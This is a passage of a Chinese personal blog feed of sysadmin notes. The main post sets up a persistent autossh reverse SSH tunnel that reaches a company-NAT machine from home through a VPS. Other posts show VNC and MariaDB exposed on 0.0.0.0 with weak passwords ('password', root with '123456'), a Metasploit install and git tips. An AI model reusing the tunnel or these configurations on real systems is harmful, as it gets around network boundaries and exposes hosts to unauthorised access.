    <published>2019-08-29T05:12:31.530Z</published>
    <updated>2019-08-29T05:10:48.859Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1，前提条件</strong></p><table><thead><tr><th>环境</th><th>系统类型</th><th>本地用户</th><th>SSH服务端口</th></tr></thead><tbody><tr><td>A机位于公司的NAT网络</td><td>安装在VMware里的Debian 8 64bit虚拟机</td><td>userA</td><td>22</td></tr><tr><td>B机是一台有公网IP的VPS</td><td>CentOS 6 64bit</td><td>userVPS</td><td>1022</td></tr><tr><td>C机位于家庭的NAT网络</td><td>Windows系统</td><td>–</td><td>–</td></tr></tbody></table><p>实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。</p><p><strong>2，原理分析</strong><br>这里先讲向SS反向隧道的原理，如果你对原理不感兴趣，可以跳过这一节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -p 22 -qngfNTR 6766:127.0.0.1:22 usera@VPS的IP  #回车以后没有反应是正常的,隧道已经建立</div></pre></td></tr></table></figure><p>命令解析：<br>从(位于本地NAT网络里的)<strong>本机</strong>访问<strong>VPS</strong>，建立一条SSH隧道（本机的随机端口到VPS的22端口）<br>同时建立了一条反向隧道，将<strong>VPS</strong>上的6766端口转发到<strong>本机</strong>的22端口。</p><p>然后，就可以从VPS的6766端口访问本地的22端口了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -p 6766 userA@127.0.0.1  #从SSH访问位于NAT网络里的linux机器</div></pre></td></tr></table></figure><p>从SSH访问位于本地NAT网络里的linux机器，这里的userA当然是本地NAT网络里的linux机器用户啦。</p><p>这样做有一个问题，那就是，由本地建立的SSH连接是会超时关闭的，如果连接关闭，隧道无法维持，那么VPS就无法利用反向隧道访问本地NAT网络了，为此我们需要一种方案来提供一条稳定的SSH反向隧道，于是autossh就派上用场了；</p><p>另外有个问题是，如果本地的Linux系统重启，那么autossh建立的隧道仍然会失效。所以这里我们采取的做法是：<br>1，将本地Linux系统的public key发给VPS，建立信任机制，这样，本地Linux系统可以无需VPS的密码而建立一条SSH隧道；<br>2，将autossh写入系统服务，使之在开机时可以自动建立SSH隧道。</p><p>知道了原理以后，接下来开始实际的操作步骤。</p><p><strong>3，VPS(B机)的操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config  #打开如下选项</div><div class="line">GatewayPorts yes</div><div class="line"> </div><div class="line">/etc/init.d/sshd reload</div></pre></td></tr></table></figure><p><strong>4，A机的操作</strong><br>前面说了，A机位于公司内部NAT网络内，是一台安装在VMware Workstation Player里的Debian 8 64bit虚拟机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autossh openssh-server</div></pre></td></tr></table></figure><p><strong>配置A机可以免密码登陆到VPS(B机)</strong><br>具体方法为将A机的公钥发给VPS(B机)，这样A机开机时就可以自动建立一条到VPS的SSH隧道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">su - userA    #这步可省略,但需要确保以下命令是在A机上以userA用户的身份运行的</div><div class="line"> </div><div class="line">ssh-keygen -t rsa    #连续三次回车,即在本地生成了公钥和私钥,不要设置密码</div><div class="line">ssh-copy-id -p VPS的SSH端口 -i ~/.ssh/id_rsa.pub userVPS@VPS的IP</div><div class="line"> </div><div class="line">sudo touch /var/log/ssh_nat.log &amp;&amp; sudo chmod 777 /var/log/ssh_nat.log</div><div class="line"> </div><div class="line">sudo vim /lib/systemd/system/autossh.service  #将下例内容粘贴复制进去</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[Unit]</div><div class="line">Description=Auto SSH Tunnel</div><div class="line">After=network-online.target</div><div class="line"> </div><div class="line">[Service]</div><div class="line">User=userA     #改掉这里A机的用户</div><div class="line">Type=simple</div><div class="line">ExecStart=/usr/bin/autossh -M 6777 -NR 8388:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@VPS的IP -p VPS的SSH端口 &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;</div><div class="line">ExecReload=/bin/kill -HUP $MAINPID</div><div class="line">KillMode=process</div><div class="line">Restart=always</div><div class="line"> </div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div><div class="line">WantedBy=graphical.target</div></pre></td></tr></table></figure><p>解释一下上面的autossh命令：<br>添加的一个-M 6777参数,负责通过6777端口监视连接状态,连接有问题时就会自动重连<br>去掉了一个-f参数,因为autossh本身就会在background运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo chmod +x /lib/systemd/system/autossh.service    #给予可执行权限</div><div class="line">sudo systemctl enable autossh    #设置开机自启</div><div class="line">sudo systemctl start autossh     #现在就启动服务</div><div class="line">sudo systemctl status autossh  #查看状态,出现Active: active (running)表示正常运行</div></pre></td></tr></table></figure><p>也可以<strong>登陆到VPS（B机）</strong>上看看8388端口是否真的有程序在监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ netstat -antp | grep :8388</div><div class="line">tcp        0      0 0.0.0.0:8388       0.0.0.0:*                   LISTEN      20041/sshd</div><div class="line">tcp        0      0 :::8388            :::*                        LISTEN      20041/sshd</div></pre></td></tr></table></figure><p><strong>5，尝试远程登陆</strong><br>接下来，我们就可以在家里的电脑(C机)上登陆到位于公司NAT网络里的那台Debian8虚拟机(A机)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh userA@VPS的IP -p 8388</div></pre></td></tr></table></figure><p>注意：这里的userA并不是VPS(B机)上的用户，而是Debian8虚拟机(A机)上的用户。</p><p>参考资料：<br><a href="http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" target="_blank" rel="external">使用SSH反向隧道进行内网穿透</a><br><a href="http://www.cnblogs.com/eshizhan/archive/2012/07/16/2592902.html" target="_blank" rel="external">SSH反向连接及Autossh</a><br><a href="https://hobo.house/2016/06/20/fun-and-profit-with-reverse-ssh-tunnels-and-autossh/" target="_blank" rel="external">Fun and Profit with Reverse SSH Tunnels and AutoSSH</a></p><p>2016/10/29 由 <a href="https://www.zhukun.net/archives/author/admin" target="_blank" rel="external">bear</a> 发表在 <a href="https://www.zhukun.net/archives/category/linux-2" target="_blank" rel="external">Linux运维</a> 分类 | 标签: | 将 <a href="https://www.zhukun.net/archives/8130" target="_blank" rel="external">固定链接</a> 加入收藏夹</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;1，前提条件&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;环境&lt;/th&gt;
&lt;th&gt;系统类型&lt;/th&gt;
&lt;th&gt;本地用户&lt;/th&gt;
&lt;th&gt;SSH服务端口&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;A机位于公司的NAT网络&lt;/td&gt;
&lt;td&gt;安装在VMware里的Debian 8 64bit虚拟机&lt;/td&gt;
&lt;td&gt;userA&lt;/td&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;B机是一台有公网IP的VPS&lt;/td&gt;
&lt;td&gt;CentOS 6 64bit&lt;/td&gt;
&lt;td&gt;userVPS&lt;/td&gt;
&lt;td&gt;1022&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C机位于家庭的NAT网络&lt;/td&gt;
&lt;td&gt;Windows系统&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>从wordpress换hexo博客后</title>
    <link href="http://demonelf.github.io/SYSTEM/%E4%BB%8Ewordpress%E6%8D%A2hexo%E5%8D%9A%E5%AE%A2%E5%90%8E.html"/>
    <id>http://demonelf.github.io/SYSTEM/从wordpress换hexo博客后.html</id>
    <published>2019-08-29T05:12:31.528Z</published>
    <updated>2019-08-29T05:10:41.531Z</updated>
    
    <content type="html"><![CDATA[<p>之前用wordpress做blog, 为什么换为hexo呢?</p><p>第一 </p><p>​    wordpress的文章都保存在服务器的数据库, 维护不是很直观.</p><p>​    而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射.</p><p>​    这样文章更好维护和查看.因为做笔记更重要的是自己也能查看.</p><p>第二</p><p>​    hexo用的github pages服务, 服务器器是git, 自己剩下服务器不说,</p><p>​    还能用到git的强大版本控制功能,真是一举多得.</p><p>如果大家发下同步命令复杂,完全可以做个成脚本就像我这这个样,点击脚本就可</p><p>把文章同步了. 真的很方便, 以下为同步步骤.</p><p><img src="hexo同步脚本.JPG" alt="hexo同步脚本"></p><ol><li>执行hexo_new.sh 生成new.md</li><li>编辑new.md为你要写的blog内容</li><li>把new.md放到你要的分类目录</li><li>执行update.sh同步blog.</li><li>呵呵,完成了</li></ol><p>hexo_new.md</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span>!/bin/bash</div><div class="line">set -x</div><div class="line">export PATH="/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs"</div><div class="line">cd /e/hexo/</div><div class="line">hexo new "new"</div></pre></td></tr></table></figure><p>update.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span>!/bin/bash</div><div class="line">set -x</div><div class="line">export PATH="/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs"</div><div class="line">cd /e/demonelf.github.io/</div><div class="line">git pull</div><div class="line">cd /e/hexo/</div><div class="line">hexo g</div><div class="line">rsync -Pv --size-only /e/hexo/public/* /e/demonelf.github.io/ -ar </div><div class="line">rsync -Pv --size-only /e/hexo/source/_posts/* /e/demonelf.github.io/ -ar</div><div class="line">cd /e/demonelf.github.io/</div><div class="line">git add -A</div><div class="line">git commit -m "1.自动更新"</div><div class="line">git push</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前用wordpress做blog, 为什么换为hexo呢?&lt;/p&gt;
&lt;p&gt;第一 &lt;/p&gt;
&lt;p&gt;​    wordpress的文章都保存在服务器的数据库, 维护不是很直观.&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>x11vnc利用xvfd实现远程vncserver</title>
    <link href="http://demonelf.github.io/SYSTEM/x11vnc%E5%88%A9%E7%94%A8xvfd%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8Bvncserver.html"/>
    <id>http://demonelf.github.io/SYSTEM/x11vnc利用xvfd实现远程vncserver.html</id>
    <published>2019-08-29T05:12:31.525Z</published>
    <updated>2019-08-29T05:10:31.812Z</updated>
    
    <content type="html"><![CDATA[<p>当然你可以直接安装vncserver实现以下功能。<br>例如：TigerVNC</p><p>环境：gentoo</p><p>安装：xvfd</p><blockquote><p>sudo USE=”xvfb” emerge -av xorg-server</p></blockquote><p>启动：xvfd</p><blockquote><p>Xvfb :2 -screen 0 800x600x24 -nolisten tcp &amp;<br>export DISPLAY=:2</p></blockquote><p>安装：x11vnc</p><blockquote><p>sudo emerge -av x11vnc</p></blockquote><p>启动：x11vnc</p><blockquote><p>x11vnc -listen 0.0.0.0 -rfbport 5900 -noipv6 -passwd password -display :2 -forever</p></blockquote><p>启动桌面：</p><blockquote><p>gnome-session –debug –disable-acceleration-check</p></blockquote><p>然后启动你喜欢的vnc客户端连接吧</p><blockquote><p>官方客户端为：ssvn 用此客户端可以实现自动缩放</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当然你可以直接安装vncserver实现以下功能。&lt;br&gt;例如：TigerVNC&lt;/p&gt;
&lt;p&gt;环境：gentoo&lt;/p&gt;
&lt;p&gt;安装：xvfd&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>rsync指定ssh端口号</title>
    <link href="http://demonelf.github.io/SYSTEM/rsync%E6%8C%87%E5%AE%9Assh%E7%AB%AF%E5%8F%A3%E5%8F%B7.html"/>
    <id>http://demonelf.github.io/SYSTEM/rsync指定ssh端口号.html</id>
    <published>2019-08-29T05:12:31.523Z</published>
    <updated>2019-08-29T05:10:26.172Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/&lt;/p&gt;
&lt;/blockquote&gt;

      
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>mariadb配置允许远程访问方式 </title>
    <link href="http://demonelf.github.io/SYSTEM/mariadb%E9%85%8D%E7%BD%AE%E5%85%81%E8%AE%B8%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F%20.html"/>
    <id>http://demonelf.github.io/SYSTEM/mariadb配置允许远程访问方式 .html</id>
    <published>2019-08-29T05:12:31.520Z</published>
    <updated>2019-08-29T05:10:17.105Z</updated>
    
    <content type="html"><![CDATA[<p>首先配置允许访问的用户，采用授权的方式给用户权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION;</div></pre></td></tr></table></figure><p>说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。</p><p>最后配置好权限之后不应该忘记刷新使之生效</p><blockquote><p>flush privileges;</p></blockquote><p>再次访问就可以了吧。</p><p>sudo vim /etc/mysql/my.cnf</p><blockquote><p>bind-address                            = 0.0.0.0</p></blockquote><p>sudo systemctl restart mariadb.service</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先配置允许访问的用户，采用授权的方式给用户权限&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39;IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>git reset revert 回退回滚取消提交返回上一版本</title>
    <link href="http://demonelf.github.io/SYSTEM/git%20reset%20revert%20%E5%9B%9E%E9%80%80%E5%9B%9E%E6%BB%9A%E5%8F%96%E6%B6%88%E6%8F%90%E4%BA%A4%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E7%89%88%E6%9C%AC.html"/>
    <id>http://demonelf.github.io/SYSTEM/git reset revert 回退回滚取消提交返回上一版本.html</id>
    <published>2019-08-29T05:12:31.515Z</published>
    <updated>2019-08-29T05:10:08.921Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://yijiebuyi.com/file/171efc85cc4adffd24a7007d07c38bc6" alt="" title="index.png"></p><p>总有一天你会遇到下面的问题.</p><p>(1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚.</p><p>(2)改完代码测试也没有问题,但是上线发现你的修改影响了之前运行正常的代码报错,必须回滚.</p><p>这些开发中很常见的问题,所以git的取消提交,回退甚至返回上一版本都是特别重要的.</p><p>大致分为下面2种情况:</p><p><strong>1.没有push</strong></p><p>这种情况发生在你的本地代码仓库,可能你add ,commit 以后发现代码有点问题,准备取消提交,用到下面命令</p><p>reset<br>git reset [–soft | –mixed | –hard</p><p>上面常见三种类型</p><p>–mixed</p><p>会保留源码,只是将git commit和index 信息回退到了某个版本.</p><p>git reset 默认是 –mixed 模式<br>git reset –mixed  等价于  git reset</p><p>–soft</p><p>保留源码,只回退到commit 信息到某个版本.不涉及index的回退,如果还需要提交,直接commit即可.</p><p>–hard</p><p>源码也会回退到某个版本,commit和index 都回回退到某个版本.(注意,这种方式是改变本地代码仓库源码)</p><p>当然有人在push代码以后,也使用 reset –hard <commit...> 回退代码到某个版本之前,但是这样会有一个问题,你线上的代码没有变,线上commit,index都没有变,当你把本地代码修改完提交的时候你会发现权是冲突…..</commit...></p><p>所以,这种情况你要使用下面的方式</p><p><strong>2.已经push</strong></p><p>对于已经把代码push到线上仓库,你回退本地代码其实也想同时回退线上代码,回滚到某个指定的版本,线上,线下代码保持一致.你要用到下面的命令</p><blockquote><p>revert</p></blockquote><p>git revert用于反转提交,执行evert命令时要求工作树必须是干净的.</p><p>git revert用一个新提交来消除一个历史提交所做的任何修改.</p><p>revert 之后你的本地代码会回滚到指定的历史版本,这时你再 git push 既可以把线上的代码更新.(这里不会像reset造成冲突的问题)</p><p>revert 使用,需要先找到你想回滚版本唯一的commit标识代码,可以用 git log 或者在adgit搭建的web环境历史提交记录里查看.</p><p>git revert c011eb3c20ba6fb38cc94fe5a8dda366a3990c61</p><p>通常,前几位即可</p><p>git revert c011eb3</p><p>git revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit</p><p>看似达到的效果是一样的,其实完全不同.</p><p>第一:</p><p>上面我们说的如果你已经push到线上代码库, reset 删除指定commit以后,你git push可能导致一大堆冲突.但是revert 并不会.</p><p>第二:</p><p>如果在日后现有分支和历史分支需要合并的时候,reset 恢复部分的代码依然会出现在历史分支里.但是revert 方向提交的commit 并不会出现在历史分支里.</p><p>第三:</p><p>reset 是在正常的commit历史中,删除了指定的commit,这时 HEAD 是向后移动了,而 revert 是在正常的commit历史中再commit一次,只不过是反向提交,他的 HEAD 是一直向前的.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://yijiebuyi.com/file/171efc85cc4adffd24a7007d07c38bc6&quot; alt=&quot;&quot; title=&quot;index.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;总有一天你会遇到下面的问题.&lt;/p&gt;
&lt;p&gt;(1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚.&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>gentoo安装metasploit4</title>
    <link href="http://demonelf.github.io/SYSTEM/gentoo%E5%AE%89%E8%A3%85metasploit4.14%E6%AD%A5%E9%AA%A4.html"/>
    <id>http://demonelf.github.io/SYSTEM/gentoo安装metasploit4.14步骤.html</id>
    <published>2019-08-29T05:12:31.513Z</published>
    <updated>2019-08-29T05:10:02.938Z</updated>
    
    <content type="html"><![CDATA[<p>先来个小忍者看看</p><p><img src="metasploit.JPG" alt="metasploit"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol><li><p>make.conf中添加</p><p>RUBY_TARGETS=”ruby23”</p></li><li><p>/etc/portage/package.keywords 中添加</p><p>=dev-lang/ruby-2.3.5</p></li><li><p>更新系统</p><p>emerge –ask –update –deep –newuse @world</p></li><li><p>选择ruby</p><p>eselect ruby set ruby23</p></li></ol><h2 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo emerge -av metasploit</div><div class="line">emerge --config postgresql</div><div class="line">/etc/init.d/postgresql-&lt;version&gt; start </div><div class="line">//systemctl start postgresql-&lt;version&gt;</div><div class="line">emerge --config =metasploit-4.14.16</div><div class="line">ln -s /usr/lib/metasploit/lib /home/demonelf/.msf4/lib</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先来个小忍者看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;metasploit.JPG&quot; alt=&quot;metasploit&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>gentoo【显卡-驱动-xorg-gnome-gui】如何工作</title>
    <link href="http://demonelf.github.io/SYSTEM/gentoo%E3%80%90%E6%98%BE%E5%8D%A1-%E9%A9%B1%E5%8A%A8-xorg-gnome-gui%E3%80%91%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C.html"/>
    <id>http://demonelf.github.io/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html</id>
    <published>2019-08-29T05:12:31.510Z</published>
    <updated>2019-08-29T05:09:55.174Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>显卡-&gt;驱动-&gt;xorg-&gt;gnome-&gt;gui</p></blockquote><p>查看显卡：lspci  | grep -i VGA</p><p>查看驱动：lspci  -vvv<br>​          </p><blockquote><p>/dev/nvidia0, /dev/nvidiactl</p><p>是NV 官方驱动引入的两个设备文件</p></blockquote><p>驱动安装：x11-drivers/xf86-video-nouveau<br>    x11-drivers/xf86-video-virtualbox</p><p>xorg支持： VIDEO_CARDS=”nouveau virtualbox”<br>    emerge -pv xorg-drivers</p><blockquote><p>现在的xorg也不需要/etc/X11/xorg.conf<br>注意把/etc/X11/xorg.conf.d/下默认的配置删除 例如:01-nv.conf</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">当然你就想手动指定驱动等信息添加xorg.conf</div><div class="line">也是没有问题的。例如：</div><div class="line">Section &quot;Device&quot;                                     </div><div class="line">        Identifier      &quot;Configured Video Device&quot;     </div><div class="line">        Driver          &quot;fbdev&quot;                  </div><div class="line">EndSection </div><div class="line">以上显卡设备为lcd 驱动设备为：/dev/fb0</div><div class="line">驱动类型为：framebuffer xf86-video-fbdev</div><div class="line">大家可以看看韦东山介绍 mini2440就是用此驱动。</div><div class="line">framebuffer表示显卡不具备任何计算能力，完全利用cpu计算。</div></pre></td></tr></table></figure><p>startx：为以上xorg gnome协同作战的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">不用startx ，手动</div><div class="line">xorg的xinit和</div><div class="line">gnome的gnome-session</div><div class="line">都是可以的。</div><div class="line">xinit 找的是/dev/nvidia0, /dev/nvidiactl</div><div class="line">gnome-session 找的是export DISPLAY=:2</div></pre></td></tr></table></figure></p><p>配置文件：.xinitrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">export GTK_IM_MODULE=ibus</div><div class="line">export XMODIFIERS=@im=ibus</div><div class="line">export QT_IM_MODULE=ibus</div><div class="line">export XDG_MENU_PREFIX=gnome-</div><div class="line">xrandr --setprovideroutputsource modesetting NVIDIA-0</div><div class="line">xrandr --auto</div><div class="line">exec gnome-session</div><div class="line">dbus-launch nm-applet &amp;</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">01:00.0 VGA compatible controller: NVIDIA Corporation G84GLM [Quadro FX 570M] (rev a1) (prog-if 00 [VGA controller])</div><div class="line">        Subsystem: Lenovo ThinkPad T61p</div><div class="line">        Physical Slot: 1</div><div class="line">        Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx-</div><div class="line">        Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-</div><div class="line">        Latency: 0</div><div class="line">        Interrupt: pin A routed to IRQ 16</div><div class="line">        Region 0: Memory at d6000000 (32-bit, non-prefetchable) [size=16M]</div><div class="line">        Region 1: Memory at e0000000 (64-bit, prefetchable) [size=256M]</div><div class="line">        Region 3: Memory at d4000000 (64-bit, non-prefetchable) [size=32M]</div><div class="line">        Region 5: I/O ports at 2000 [size=128]</div><div class="line">        [virtual] Expansion ROM at 000c0000 [disabled] [size=128K]</div><div class="line">        Capabilities: [60] Power Management version 2</div><div class="line">                Flags: PMEClk- DSI- D1- D2- AuxCurrent=0mA PME(D0-,D1-,D2-,D3hot-,D3cold-)</div><div class="line">                Status: D0 NoSoftRst- PME-Enable- DSel=0 DScale=0 PME-</div><div class="line">        Capabilities: [68] MSI: Enable- Count=1/1 Maskable- 64bit+</div><div class="line">                Address: 0000000000000000  Data: 0000</div><div class="line">        Capabilities: [78] Express (v1) Endpoint, MSI 00</div><div class="line">                DevCap: MaxPayload 128 bytes, PhantFunc 0, Latency L0s &lt;512ns, L1 &lt;4us</div><div class="line">                        ExtTag+ AttnBtn- AttnInd- PwrInd- RBE+ FLReset- SlotPowerLimit 75.000W</div><div class="line">                DevCtl: Report errors: Correctable- Non-Fatal- Fatal- Unsupported-</div><div class="line">                        RlxdOrd+ ExtTag+ PhantFunc- AuxPwr- NoSnoop+</div><div class="line">                        MaxPayload 128 bytes, MaxReadReq 512 bytes</div><div class="line">                DevSta: CorrErr- UncorrErr- FatalErr- UnsuppReq- AuxPwr- 